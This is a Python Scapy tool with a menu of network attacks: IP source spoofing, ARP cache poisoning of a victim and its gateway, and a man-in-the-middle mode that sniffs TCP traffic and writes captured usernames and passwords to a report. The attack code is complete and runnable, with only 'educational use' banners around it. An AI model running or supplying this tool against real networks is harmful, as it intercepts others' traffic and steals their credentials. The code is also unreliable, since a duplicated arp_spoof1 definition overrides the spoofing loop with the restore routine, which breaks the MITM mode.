from scapy.all import *
import random
import time
import os
import netifaces
import logging
import threading

def print_banner():
    print("""
    ██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗    
    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝    
    ██████╔╝███████║██║     █████╔╝ █████╗     ██║       
    ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║       
    ██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║       
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝       
    """)
    
    print("""
    ███╗   ███╗ █████╗ ███╗   ██╗██╗██████╗ ██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗
    ████╗ ████║██╔══██╗████╗  ██║██║██╔══██╗██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
    ██╔████╔██║███████║██╔██╗ ██║██║██████╔╝██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
    ██║╚██╔╝██║██╔══██║██║╚██╗██║██║██╔═══╝ ██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
    ██║ ╚═╝ ██║██║  ██║██║ ╚████║██║██║     ╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═╝  ╚═╝
    """)
    print(f"{' ' * 50}👤 Vinay Vijayanand  |  Deepthi Krishnan  |  Amal Shaji M S\n")

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)
        self.spoofing = False
        logging.basicConfig(filename='arp_spoof.log', level=logging.INFO)

    def _get_mac(self, ip):
        """Resolve MAC address for given IP"""
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=self.interface, verbose=False)
        for sent, received in ans:
            return received.hwsrc
        return None

    def start_spoofing(self):
        """Start ARP spoofing attack"""
        if not self.target_mac or not self.gateway_mac:
            print("[!] Could not get MAC addresses. Check IPs and network connectivity.")
            return

        print(f"[*] Starting ARP spoofing: {self.target_ip} <--> {self.gateway_ip}")
        self.spoofing = True

        try:
            while self.spoofing:
                # Tell target we're the gateway
                target_packet = Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
                sendp(target_packet, iface=self.interface, verbose=False)

                # Tell gateway we're the target
                gateway_packet = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
                sendp(gateway_packet, iface=self.interface, verbose=False)

                time.sleep(2)
                logging.info(f"Sent spoofed ARP packets at {time.ctime()}")

        except KeyboardInterrupt:
            self.restore_network()
        except Exception as e:
            logging.error(f"Spoofing error: {e}")
            self.restore_network()

    def restore_network(self):
        """Restore original ARP tables"""
        if not self.spoofing:
            return
        print("\n[*] Restoring network...")

        # Send correct ARP info to target
        sendp(Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac),
        iface=self.interface, verbose=False, count=5)

        # Send correct ARP info to gateway
        sendp(Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac),
        iface=self.interface, verbose=False, count=5)

        logging.info("Network restored")
        self.spoofing = False

def generate_report(packets, report_file):
    """ Analyze captured packets and generate a network report """
    protocol_count = {}
    ip_sources = {}

    for pkt in packets:
        if IP in pkt:
            src_ip = pkt[IP].src
            ip_sources[src_ip] = ip_sources.get(src_ip, 0) + 1

        proto = pkt.summary().split()[0]
        protocol_count[proto] = protocol_count.get(proto, 0) + 1

    with open(report_file, "w") as f:
        f.write("==== Network Analysis Report ====\n")
        f.write(f"Total Packets Captured: {len(packets)}\n\n")
        
        f.write("🔹 Protocol Distribution:\n")
        for proto, count in protocol_count.items():
            f.write(f"  - {proto}: {count} packets\n")
        
        f.write("\n🔹 Top 5 Source IPs:\n")
        sorted_ips = sorted(ip_sources.items(), key=lambda x: x[1], reverse=True)[:5]
        for ip, count in sorted_ips:
            f.write(f"  - {ip}: {count} packets\n")

    print(f"[+] Network report saved to {report_file}")

def scan_network(interface, output_file=None):
    print(f"[*] Sniffing on {interface}... Press Ctrl+C to stop.")
    packets = sniff(iface=interface, prn=lambda pkt: pkt.summary(), store=True)
    
    if output_file:
        wrpcap(output_file, packets)
        print(f"[+] Packets saved to {output_file}")
        report_file = output_file.replace(".pcap", "_report.txt")
        generate_report(packets, report_file)

def send_packet(destination, protocol, port, spoof_ip=None, custom_data=None):
    print(f"[*] Sending {protocol.upper()} packet to {destination}:{port}")

    if protocol.lower() == "icmp":
        packet = IP(dst=destination, src=spoof_ip if spoof_ip else None) / ICMP()
    elif protocol.lower() == "tcp":
        packet = IP(dst=destination, src=spoof_ip if spoof_ip else None) / TCP(dport=int(port), flags="S")
    elif protocol.lower() == "udp":
        packet = IP(dst=destination, src=spoof_ip if spoof_ip else None) / UDP(dport=int(port))
    else:
        print("[!] Unsupported protocol!")
        return

    if custom_data:
        packet = packet / Raw(load=custom_data)

    send(packet, verbose=False)
    print("[+] Packet sent!")

def get_gateway_ip(interface):
    """ Automatically find the gateway IP for the given interface """
    try:
        gws = netifaces.gateways()
        return gws['default'][netifaces.AF_INET][0]
    except Exception as e:
        print(f"[!] Could not determine gateway IP: {e}")
        return None

def capture_quic(interface, count, output_file=None):
    print(f"[*] Capturing QUIC packets on {interface}... Press Ctrl+C to stop.")
    packets = sniff(iface=interface, filter="udp port 443", count=count, store=True)

    if output_file:
        wrpcap(output_file, packets)
        print(f"[+] QUIC packets saved to {output_file}")
        report_file = output_file.replace(".pcap", "_report.txt")
        generate_report(packets, report_file)

def intercept_traffic(interface, filter_exp, output_file=None):
    print(f"[*] Intercepting packets on {interface} with filter: {filter_exp}")
    packets = sniff(iface=interface, filter=filter_exp, store=True)

    if output_file:
        wrpcap(output_file, packets)
        print(f"[+] Intercepted packets saved to {output_file}")
        report_file = output_file.replace(".pcap", "_report.txt")
        generate_report(packets, report_file)

def random_ip():
    """Generate a random spoofed IP address."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def display_menu():
    print_banner()
    print("1️⃣  Scan Network (Sniff packets)")
    print("2️⃣  Send a Custom Packet")
    print("3️⃣  Perform ARP Spoofing")
    print("4️⃣  Capture QUIC Packets (UDP/443)")
    print("5️⃣  MITM Attack Testing Tool (capture credentials)")
    print("0️⃣  Exit\n")



# File names for logs
PCAP_FILE = "captured_packets.pcap"
REPORT_FILE = "mitm_report.txt"

# Store captured packets globally
captured_packets = []

# Function to get MAC address of an IP
def get_mac1(ip):
    """Retrieve the MAC address of a device via ARP request."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    return None

# ARP Spoofing Function
def arp_spoof1(target_ip, spoof_ip, target_mac1):
    """Sends ARP spoofed packets to poison the target's ARP cache."""
    packet = Ether(dst=target_mac1) / ARP(op=2, pdst=target_ip, hwdst=target_mac1, psrc=spoof_ip)
    count = 0  # Counter for sent packets
    
    while True:
        sendp(packet, verbose=False)
        count += 1
        if count % 5 == 0:  # Print status every 5 packets
            print(f"[+] Sent {count} ARP replies to {target_ip}, spoofing {spoof_ip}")
        time.sleep(2)

# Restore ARP tables
def arp_spoof1(target_ip, spoof_ip, target_mac1, spoof_mac):
    """Restores ARP tables to prevent network disruption."""
    packet = Ether(dst=target_mac1) / ARP(op=2, pdst=target_ip, hwdst=target_mac1, psrc=spoof_ip, hwsrc=spoof_mac)
    sendp(packet, count=5, verbose=False)

# Sniff network packets
def sniff_packets1(iface):
    """Sniffs network traffic and extracts potential credentials."""
    print(f"[*] Sniffing on {iface}... Waiting for data.")
    sniff(iface=iface, store=True, prn=process_packet1, filter="tcp")

# Process captured packets
def process_packet1(packet):
    """Extracts and logs packet details."""
    global captured_packets
    captured_packets.append(packet)

    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        proto = packet.summary().split()[0]

        print(f"[+] Packet Captured: {src_ip} → {dst_ip} | Protocol: {proto}")

    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors="ignore")
        if any(keyword in payload.lower() for keyword in ["password", "login", "username"]):
            print(f"\n[!!!] Possible Credentials Captured:\n{payload}")

# Generate detailed report
def generate_report1():
    """Creates a simplified report showing only IPs and essential credential details."""
    unique_ips = set()
    credentials_found = []

    with open(REPORT_FILE, "w") as report_file:
        report_file.write("=== MITM Attack Report ===\n\n")

        # Collect unique IPs
        for pkt in captured_packets:
            if pkt.haslayer(IP):
                unique_ips.add(pkt[IP].src)

            # Extract credentials if found
            if pkt.haslayer(Raw):
                raw_data = pkt[Raw].load.decode(errors="ignore")
                if any(keyword in raw_data.lower() for keyword in ["password", "login", "username"]):
                    credentials_found.append(extract_credential_details1(raw_data))

        # Write unique IPs
        report_file.write("🔹 Unique IPs:\n")
        for ip in unique_ips:
            report_file.write(f"  - {ip}\n")

        # Write extracted credential details
        if credentials_found:
            report_file.write("\n🚨 Captured Credentials:\n")
            for cred in credentials_found:
                report_file.write(f"  - {cred}\n")
        else:
            report_file.write("\n🚨 No credentials were captured.\n")

    print(f"[+] Simplified report saved to: {REPORT_FILE}")

def extract_credential_details1(data):
    """Extracts only key credential details in a clean format."""
    parts = data.split("&")
    filtered_info = []

    for part in parts:
        if "=" in part:
            key, value = part.split("=", 1)
            if any(kw in key.lower() for kw in ["user", "login", "pass"]):
                filtered_info.append(f"{key}: {value}")

    return ", ".join(filtered_info)







def main():
    while True:
        display_menu()
        choice = input("Enter your choice (0-5): ")

        if choice == "1":
            print("\n🔹 Scan Network")
            interface = input("Enter Network Interface (e.g., eth0, wlan0): ")
            output_file = input("Enter Output File Name to Save Packets (e.g., capture.pcap): ")
            scan_network(interface, output_file)

        elif choice == "2":
            print("\n🔹 Send a Custom Packet")
            destination = input("Enter Destination IP: ")
            protocol = input("Enter Protocol (icmp/tcp/udp): ").lower()
            port = input("Enter Destination Port (0 for ICMP, press Enter for default 80): ")
            if not port:
                port = "80"  # Default to HTTP if empty
            spoof_ip = input("Enter Spoofed Source IP (or leave blank): ")
            custom_data = input("Enter Custom Data to Send (or leave blank): ")
            send_packet(destination, protocol, int(port), spoof_ip, custom_data)

        elif choice == "3":
             print("\n🔹 ARP Spoofing (MITM Attack)")
             print("⚠️  WARNING: This will disrupt network traffic!")
             
             target_ip = input("Target IP: ").strip()
             gateway_ip = input("Gateway/Router IP: ").strip()
             interface = input("Network Interface (e.g., eth0): ").strip()
    
             try:
                 # Enable IP forwarding (requires root)
                 with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                     f.write('1')
            
                 spoofer = ARPSpoofer(target_ip, gateway_ip, interface)
        
                 try:
                     spoofer.start_spoofing()
                 except KeyboardInterrupt:
                     print("\n[*] Stopping attack...")
                     spoofer.restore_network()
            
             except PermissionError:
                 print("[!] Must run as root!")
             except Exception as e:
                 print(f"[!] Error: {e}")
        
            
        elif choice == "4":
            print("\n🔹 Capture QUIC Packets")
            interface = input("Enter Network Interface: ")
            count = int(input("Enter Number of Packets to Capture: "))
            output_file = input("Enter Output File Name (e.g., quic.pcap): ")
            capture_quic(interface, count, output_file)

        elif choice == "5":

                """Sets up MITM attack, ARP spoofing, and sniffing."""
                try:
                    
                    print("MITM Attack Testing Tool (Educational Use Only)")

                    # Get user input
                    victim_ip = input("[?] Victim IP: ").strip()
                    gateway_ip = input("[?] Gateway/Router IP: ").strip()
                    iface = input("[?] Network interface (e.g., eth0, wlan0): ").strip()

                    print("[+] Finding MAC addresses...")
                    victim_mac = get_mac1(victim_ip)
                    gateway_mac = get_mac1(gateway_ip)

                    if not victim_mac or not gateway_mac:
                        print("[-] Could not retrieve MAC addresses. Exiting...")
                        sys.exit(1)

                    print(f"[+] Victim MAC: {victim_mac}")
                    print(f"[+] Gateway MAC: {gateway_mac}")

                    print("[+] Enabling IP forwarding...")
                    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

                    print(f"[+] ARP Spoofing started: {victim_ip} <--> {gateway_ip}")

                    # Start ARP spoofing in separate threads
                    spoof_thread1 = threading.Thread(target=arp_spoof1, args=(victim_ip, gateway_ip, victim_mac), daemon=True)
                    spoof_thread2 = threading.Thread(target=arp_spoof1, args=(gateway_ip, victim_ip, gateway_mac), daemon=True)
        
                    # Start packet sniffing in a separate thread
                    sniff_thread = threading.Thread(target=sniff_packets1, args=(iface,), daemon=True)

                    spoof_thread1.start()
                    spoof_thread2.start()
                    sniff_thread.start()

                    print("[+] MITM Attack Running... Press Ctrl+C to stop.")

                    while True:
                        time.sleep(1)

                except KeyboardInterrupt:
                    print("\n[!] Stopping attack...")
                    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                    print("[+] Restoring ARP tables...")
                    arp_spoof1(victim_ip, gateway_ip, victim_mac, gateway_mac)
                    arp_spoof1(gateway_ip, victim_ip, gateway_mac, victim_mac)
                    print("[+] Attack stopped.")

                    # Save captured packets to a pcap file for Wireshark analysis
                    wrpcap(PCAP_FILE, captured_packets)
                    print(f"[+] Captured packets saved to: {PCAP_FILE}")

                    # Generate a detailed report
                    print("[+] Generating report...")
                    generate_report1()
                    print(f"[+] Report complete. Check '{REPORT_FILE}' and '{PCAP_FILE}'.")

    
            
        elif choice == "0":
            print("🔹 Exiting... Goodbye!")
            break

if __name__ == "__main__":
    main()
